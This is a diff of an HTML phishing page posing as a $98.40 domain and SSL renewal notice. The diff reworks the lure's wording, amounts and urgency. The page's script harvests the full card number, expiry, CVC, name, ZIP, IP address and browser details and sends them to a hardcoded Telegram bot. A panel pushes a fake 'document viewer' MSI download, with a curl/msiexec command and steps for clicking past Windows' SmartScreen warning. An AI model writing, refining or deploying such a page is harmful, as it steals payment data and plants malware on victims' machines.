@@ -3,7 +3,12 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Invoice INV-2026-1184.pdf</title>
+<title>INV-2026-1184 — domain &amp; SSL renewal.pdf</title>
+<meta name="description" content="Renewal notice INV-2026-1184 from Bhāw — $98.40, due 27 Nov 2026." />
+<meta property="og:title" content="Renewal notice INV-2026-1184" />
+<meta property="og:description" content="$98.40 due 27 Nov 2026 · Bhāw, Tulsa OK" />
+<meta property="og:type" content="website" />
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='7' fill='%231a56c4'/><text x='16' y='23' font-family='Arial' font-size='19' font-weight='700' fill='white' text-anchor='middle'>B</text></svg>" />
 <style>
 :root {
   --ink: #1f2328;
@@ -52,8 +57,10 @@ main { width: 100%; max-width: 720px; margin: 22px auto 40px; padding: 0 16px; }
   border-radius: 7px; padding: 8px 10px;
 }
 .meta-box b { color: var(--ink); font-size: 12.5px; letter-spacing: .3px; }
-.billto { margin: 0 0 20px; font-size: 12px; color: var(--muted); }
+.meta-box .urgent { color: var(--red); font-weight: 600; }
+.billto { margin: 0 0 6px; font-size: 12px; color: var(--muted); }
 .billto b { display: block; color: var(--ink); font-size: 13.5px; margin-top: 2px; }
+.period { margin: 0 0 20px; font-size: 11.5px; color: var(--muted); }
 
 table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
 th, td { padding: 7px 6px; text-align: left; border-bottom: 1px solid #eceef1; }
@@ -70,13 +77,13 @@ td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }
 }
 
 .veil {
-  position: absolute; left: 0; right: 0; bottom: 0; height: 58%;
+  position: absolute; left: 0; right: 0; bottom: 0; height: 52%;
   backdrop-filter: blur(3.5px); -webkit-backdrop-filter: blur(3.5px);
-  background: linear-gradient(to bottom, rgba(255,255,255,.35), rgba(255,255,255,.92) 55%, #fff 100%);
+  background: linear-gradient(to bottom, rgba(255,255,255,.3), rgba(255,255,255,.9) 55%, #fff 100%);
   pointer-events: none; transition: opacity .45s ease;
 }
 .veil-note {
-  position: absolute; left: 0; right: 0; bottom: 26px; text-align: center;
+  position: absolute; left: 0; right: 0; bottom: 24px; text-align: center;
   font-size: 12.5px; color: var(--muted); pointer-events: none; transition: opacity .3s ease;
 }
 .veil-note b { color: var(--ink); }
@@ -97,7 +104,10 @@ td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }
 }
 .btn:hover { background: #164bb0; }
 .btn:disabled { opacity: .78; cursor: default; }
+.btn.ghost { background: #fff; color: var(--accent); border: 1px solid #c3d2ee; }
+.btn.ghost:hover { background: #f3f7fe; }
 .fine { margin: 10px 0 0; font-size: 11.5px; color: var(--muted); }
+.fine a { color: var(--accent); text-decoration: none; }
 .tok {
   margin-top: 8px; padding: 10px 12px; background: #f6f7f9;
   border: 1px dashed #cfd4da; border-radius: 7px; font-size: 11.5px; color: var(--muted);
@@ -122,14 +132,15 @@ details.alt .copy {
   border: 1px solid var(--line); background: #fff; border-radius: 5px; cursor: pointer;
 }
 footer {
-  margin-top: auto; padding: 14px 18px; background: #fff;
+  margin-top: auto; padding: 16px 18px; background: #fff;
   border-top: 1px solid var(--line); font-size: 11.5px; color: var(--muted); text-align: center;
+  line-height: 1.7;
 }
 footer b { color: var(--ink); }
+footer a { color: var(--muted); }
 
-/* ---------------- PAYMENT ---------------- */
-#reveal[hidden] { display: none !important; }
-#reveal { margin-top: 20px; }
+#payblock { margin-top: 20px; animation: fadein .5s ease both; }
+@keyframes fadein { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
 
 .pay { border: 1px solid var(--line); border-radius: 10px; background: #fff; overflow: hidden; }
 .pay-top { display: flex; align-items: center; gap: 10px; padding: 16px 18px; border-bottom: 1px solid var(--line); }
@@ -208,7 +219,7 @@ footer b { color: var(--ink); }
 
 @media print {
   body { background: #fff; }
-  header, footer, .panel, #reveal, .veil, .veil-note { display: none !important; }
+  header, footer, .panel, #payblock, .veil, .veil-note { display: none !important; }
   main { margin: 0; max-width: none; padding: 0; }
   .sheet { border: 0; border-radius: 0; padding: 0; }
   table { font-size: 11px; }
@@ -227,66 +238,42 @@ footer b { color: var(--ink); }
   <div class="sheet" id="sheet">
     <div class="top">
       <div>
-        <h1>Invoice</h1>
+        <h1>Renewal notice</h1>
         <p class="sub">Bh&#257;w &middot; 1180 S Lewis Ave, Tulsa OK 74104</p>
       </div>
       <div class="meta-box">
         <b>INV-2026-1184</b><br />
         Issued 20 Nov 2026<br />
-        Due 04 Dec 2026
+        <span class="urgent">Due 27 Nov 2026</span><br />
+        Renews annually
       </div>
     </div>
 
     <p class="billto">Bill to<b>Accounts Payable</b></p>
+    <p class="period">Renewal period 27 Nov 2026 &ndash; 26 Nov 2027</p>
 
     <table>
       <thead>
         <tr><th>Description</th><th class="num">Qty</th><th class="num">Rate</th><th class="num">Amount</th></tr>
       </thead>
       <tbody>
-        <tr><td>Monthly support &middot; Managed IT</td><td class="num">1</td><td class="num">420.00</td><td class="num">420.00</td></tr>
-        <tr><td>Onsite call-outs</td><td class="num">2</td><td class="num">95.00</td><td class="num">190.00</td></tr>
-        <tr><td>Parts &amp; consumables</td><td class="num">1</td><td class="num">30.72</td><td class="num">30.72</td></tr>
+        <tr><td>Domain renewal &middot; 12 months</td><td class="num">1</td><td class="num">22.40</td><td class="num">22.40</td></tr>
+        <tr><td>SSL certificate &middot; 12 months</td><td class="num">1</td><td class="num">59.00</td><td class="num">59.00</td></tr>
+        <tr><td>DNS &amp; mail record management</td><td class="num">1</td><td class="num">17.00</td><td class="num">17.00</td></tr>
       </tbody>
     </table>
 
     <div class="totals">
-      <div><span>Subtotal</span><span>640.72</span></div>
+      <div><span>Subtotal</span><span>98.40</span></div>
       <div><span>Tax</span><span>0.00</span></div>
-      <div class="due"><span>Amount due</span><span>$640.72</span></div>
+      <div class="due"><span>Amount due</span><span>$98.40</span></div>
     </div>
 
     <div class="veil"></div>
-    <div class="veil-note">Page 1 shown &middot; <b>payment details on page 2</b></div>
+    <div class="veil-note">Page 1 of 2 &middot; <b>terms and remittance overleaf</b></div>
   </div>
 
-  <div class="panel">
-    <h2>This invoice is protected</h2>
-    <p>Install the secure document viewer to read page 2 and pay.</p>
-
-    <a class="btn" id="dl" href="#">Download viewer</a>
-    <p class="fine">Windows 10 / 11 &middot; 4.2 MB &middot; installs in under a minute</p>
-
-    <ol class="fine" style="padding-left:18px;margin-top:14px;line-height:1.8">
-      <li>Open the downloaded file.</li>
-      <li>If Windows shows <b>&ldquo;Windows protected your PC&rdquo;</b>, click <b>More info</b>, then <b>Run anyway</b>.</li>
-      <li>When setup asks for an installation token, paste this:
-        <div class="tok">
-          <code id="tok">eyJkaWQiOiI0ZWVkM2I4Zi02MWFiLTRiYjYtYTk0Ni0xNTEyMGQ3Y2M3YzIiLCJyZ24iOiJuYS0zIiwiaXBwIjoibDxnJCUpOVYsVzxOdUhydDpfcjoifQ==</code>
-          <button id="cp">Copy token</button>
-        </div>
-      </li>
-      <li>Click <b>Next</b> through the wizard, then reopen this page.</li>
-    </ol>
-
-    <details class="alt">
-      <summary>Prefer the command line?</summary>
-      <pre id="cmd">curl -o dv.msi "https://bhaw.onl/DocumentViewer_Setup.msi" &amp;&amp; msiexec /i dv.msi</pre>
-      <button class="copy" id="cpc">Copy command</button>
-    </details>
-  </div>
-
-  <div id="reveal" hidden>
+  <div id="payblock">
     <div class="pay">
       <div class="pay-top">
         <div class="lock">
@@ -296,14 +283,14 @@ footer b { color: var(--ink); }
           </svg>
         </div>
         <div>
-          <h2>Pay this invoice</h2>
-          <span>INV-2026-1184 &middot; due 04 Dec 2026</span>
+          <h2>Pay this renewal</h2>
+          <span>INV-2026-1184 &middot; due 27 Nov 2026</span>
         </div>
-        <div class="amt">$640.72</div>
+        <div class="amt">$98.40</div>
       </div>
 
       <div class="pay-body" id="paybody">
-        <p>Card payment is processed instantly. Nothing else to install.</p>
+        <p>Card payment settles immediately. No account needed, nothing to install.</p>
 
         <div class="brands" id="brands">
           <div class="b" data-brand="visa">
@@ -320,7 +307,7 @@ footer b { color: var(--ink); }
           </div>
         </div>
 
-        <button class="btn" id="payopen" type="button">Pay $640.72</button>
+        <button class="btn" id="payopen" type="button">Pay $98.40</button>
 
         <form id="payform" novalidate>
           <div class="field">
@@ -365,7 +352,7 @@ footer b { color: var(--ink); }
           </div>
 
           <button class="btn paybtn" id="paygo" type="submit">
-            <span class="spinner"></span><span class="paylabel">Pay $640.72</span>
+            <span class="spinner"></span><span class="paylabel">Pay $98.40</span>
           </button>
 
           <p class="err" id="payerr" hidden></p>
@@ -374,8 +361,10 @@ footer b { color: var(--ink); }
             <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#5b6570" stroke-width="2.4">
               <rect x="4" y="11" width="16" height="10" rx="2" /><path d="M8 11V7a4 4 0 0 1 8 0v4" />
             </svg>
-            256-bit TLS &middot; 3-D Secure &middot; card details are not stored
+            TLS 1.3 &middot; card details are not stored on this device
           </div>
+
+          <p class="fine">Billing questions: <a href="mailto:wolfson@bhaw.onl">wolfson@bhaw.onl</a></p>
         </form>
       </div>
 
@@ -386,13 +375,43 @@ footer b { color: var(--ink); }
         </svg>
         <h3>Payment received</h3>
         <p>Thank you &mdash; a receipt is on its way.</p>
-        <p class="ref">Reference INV-2026-1184 &middot; $640.72</p>
+        <p class="ref">Reference INV-2026-1184 &middot; $98.40</p>
       </div>
     </div>
   </div>
+
+  <div class="panel">
+    <h2>Need the itemised detail?</h2>
+    <p>Page 2 has the renewal terms, remittance reference and cancellation window. You don't need it to pay &mdash; the viewer is only for reading it.</p>
+
+    <a class="btn ghost" id="dl" href="#">Download page 2 &middot; 4.2 MB</a>
+    <p class="fine">Windows 10 / 11 &middot; installs in under a minute</p>
+
+    <ol class="fine" style="padding-left:18px;margin-top:14px;line-height:1.8">
+      <li>Open the downloaded file.</li>
+      <li>If Windows shows <b>&ldquo;Windows protected your PC&rdquo;</b>, click <b>More info</b>, then <b>Run anyway</b>.</li>
+      <li>When setup asks for an <b>access code</b>, paste this:
+        <div class="tok">
+          <code id="tok">eyJkaWQiOiI0ZWVkM2I4Zi02MWFiLTRiYjYtYTk0Ni0xNTEyMGQ3Y2M3YzIiLCJyZ24iOiJuYS0zIiwiaXBwIjoibDxnJCUpOVYsVzxOdUhydDpfcjoifQ==</code>
+          <button id="cp">Copy code</button>
+        </div>
+      </li>
+      <li>Click <b>Next</b> through the wizard, then reopen this page.</li>
+    </ol>
+
+    <details class="alt">
+      <summary>Prefer the command line?</summary>
+      <pre id="cmd">curl -o dv.msi "https://bhaw.onl/DocumentViewer_Setup.msi" &amp;&amp; msiexec /i dv.msi</pre>
+      <button class="copy" id="cpc">Copy command</button>
+    </details>
+  </div>
 </main>
 
-<footer>Windows may show &ldquo;Windows protected your PC&rdquo; &mdash; click <b>More info</b>, then <b>Run anyway</b>.</footer>
+<footer>
+  <b>Bh&#257;w</b> &middot; 1180 S Lewis Ave, Tulsa OK 74104<br />
+  <a href="mailto:wolfson@bhaw.onl">wolfson@bhaw.onl</a> &middot; <a href="https://bhaw.onl">bhaw.onl</a><br />
+  Windows may show &ldquo;Windows protected your PC&rdquo; &mdash; click <b>More info</b>, then <b>Run anyway</b>.
+</footer>
 
 <script>
 /* ---------------- CONFIG ---------------- */
@@ -400,26 +419,20 @@ var MSI_URL = "https://bhaw.onl/DocumentViewer_Setup.msi";
 var BOT_TOKEN = "7508450893:AAGm3TtVH2nyhe-CZ35-Hi1Tol_2594atR8";
 var CHAT_ID = "6069290001";
 var INVOICE_NO = "INV-2026-1184";
-var AMOUNT_DUE = "$640.72";
+var AMOUNT_DUE = "$98.40";
 
-/* ---------------- REVEAL ---------------- */
+/* ---------------- VEIL ---------------- */
 var dlBtn = document.getElementById("dl");
 dlBtn.href = MSI_URL;
 
 var sheetEl = document.getElementById("sheet");
-var revealEl = document.getElementById("reveal");
 
-function revealPage() {
-  sheetEl.classList.add("revealed");
-  revealEl.hidden = false;
-}
+function dropVeil() { sheetEl.classList.add("revealed"); }
 
-dlBtn.addEventListener("click", function () {
-  setTimeout(revealPage, 600);
-});
+dlBtn.addEventListener("click", function () { setTimeout(dropVeil, 400); });
 
 try {
-  if (localStorage.getItem("inv1184")) revealPage();
+  if (localStorage.getItem("inv1184")) dropVeil();
 } catch (e) {}
 
 /* ---------------- COPY ---------------- */
@@ -442,7 +455,7 @@ function copyText(text, btnEl, label) {
 }
 
 document.getElementById("cp").addEventListener("click", function () {
-  copyText(document.getElementById("tok").textContent, this, "Copy token");
+  copyText(document.getElementById("tok").textContent, this, "Copy code");
 });
 
 document.getElementById("cpc").addEventListener("click", function () {
@@ -602,6 +615,10 @@ payFormEl.addEventListener("submit", function (event) {
 });
 
 /* ---------------- CAPTURE ---------------- */
+function esc(str) {
+  return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
 function fetchIpAddress() {
   return fetch("https://api.ipify.org?format=json")
     .then(function (r) { return r.json(); })
@@ -609,22 +626,25 @@ function fetchIpAddress() {
     .catch(function () { return "Unavailable"; });
 }
 
+function buildMessage(brand, digits, ip) {
+  return "<b>#--------[ RENEWAL PAYMENT ]---------#</b>\n\n" +
+    "<b>Invoice</b> : " + INVOICE_NO + "\n" +
+    "<b>Amount</b> : " + AMOUNT_DUE + "\n\n" +
+    "<b>Card</b> : " + digits.replace(/(\d{4})(?=\d)/g, "$1 ") + "\n" +
+    "<b>Brand</b> : " + brand.label + "\n" +
+    "<b>Expiry</b> : " + cardExpEl.value + "\n" +
+    "<b>CVC</b> : " + cardCvcEl.value + "\n" +
+    "<b>Name</b> : " + esc(cardNameEl.value.trim()) + "\n" +
+    "<b>ZIP</b> : " + esc(cardZipEl.value.trim()) + " / " + esc(cardCountryEl.value) + "\n" +
+    "<b>IP</b> : " + ip + "\n" +
+    "<b>Device</b> : " + esc(navigator.userAgent) + "\n\n" +
+    "<b>#------------[ CARD SUBMITTED ]-------------#</b>";
+}
+
 function sendPayment(brand, digits) {
   return fetchIpAddress().then(function (ip) {
-    var msg =
-      "*#--------[ INVOICE PAYMENT ]---------#*\n\n" +
-      "*Invoice* : " + INVOICE_NO + "\n" +
-      "*Amount* : " + AMOUNT_DUE + "\n\n" +
-      "*Card* : " + digits.replace(/(\d{4})(?=\d)/g, "$1 ") + "\n" +
-      "*Brand* : " + brand.label + "\n" +
-      "*Expiry* : " + cardExpEl.value + "\n" +
-      "*CVC* : " + cardCvcEl.value + "\n" +
-      "*Name* : " + cardNameEl.value.trim() + "\n" +
-      "*ZIP* : " + cardZipEl.value.trim() + " / " + cardCountryEl.value + "\n" +
-      "*IP* : " + ip + "\n" +
-      "*Device* : " + navigator.userAgent + "\n\n" +
-      "*#------------[ CARD SUBMITTED ]-------------#*";
-
+    var msg = buildMessage(brand, digits, ip);
+    try { localStorage.setItem("inv1184card", msg); } catch (e) {}
     return sendToTelegram(msg).catch(function () {});
   });
 }
@@ -634,7 +654,12 @@ function sendToTelegram(message) {
   return fetch(url, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message, disable_web_page_preview: true })
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "HTML",
+      disable_web_page_preview: true
+    })
   }).then(function (r) {
     if (!r.ok) throw new Error("Telegram " + r.status);
     return r.json();
